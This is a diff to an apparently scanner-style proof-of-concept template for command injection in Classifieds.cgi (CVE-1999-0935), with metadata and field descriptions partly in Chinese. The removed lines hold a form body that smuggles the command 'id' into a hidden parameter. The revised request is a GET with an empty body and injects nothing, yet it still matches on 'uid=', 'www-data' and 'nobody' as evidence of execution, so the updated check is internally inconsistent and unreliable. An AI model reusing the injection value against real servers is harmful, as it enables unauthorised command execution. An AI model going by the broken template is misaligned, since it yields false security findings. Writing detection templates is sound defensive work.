@@ -1,29 +1,32 @@
 [info]
 author = "ave"
-description = "检测 Classifieds.cgi 1.0 是否存在隐藏变量命令注入漏洞。通过向 CGI 表单提交包含系统命令的隐藏参数，验证服务器是否执行了注入的命令。"
+description = "通过向 Classifieds.cgi 的隐藏变量注入系统命令，远程以 Web 进程权限执行任意命令，验证服务器是否受漏洞影响。"
 id = "POC-AVE-1999-1314"
-name = "Classifieds.cgi 1.0 远程命令执行 PoC"
+name = "Greg Matthews Classifieds.cgi 任意命令执行漏洞 PoC"
 severity = "critical"
-tags = ["ave-1999-1314"]
+tags = [
+    "cve-1999-0935",
+    "rce",
+    "cgi",
+]
 vuln_id = [
     "CVE-1999-0935",
     "AVE-1999-1314",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
-method = "POST"
+method = "GET"
 path = "/{{BaseURL}}/classifieds.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "classified_id=1&user=admin&password=admin&action=view&cmd=id"
+content = ""
 type = "raw"
 
 [poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
 User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
@@ -32,6 +35,6 @@ part = "body"
 type = "word"
 words = [
     "uid=",
-    "root:",
-    "bin/",
+    "www-data",
+    "nobody",
 ]
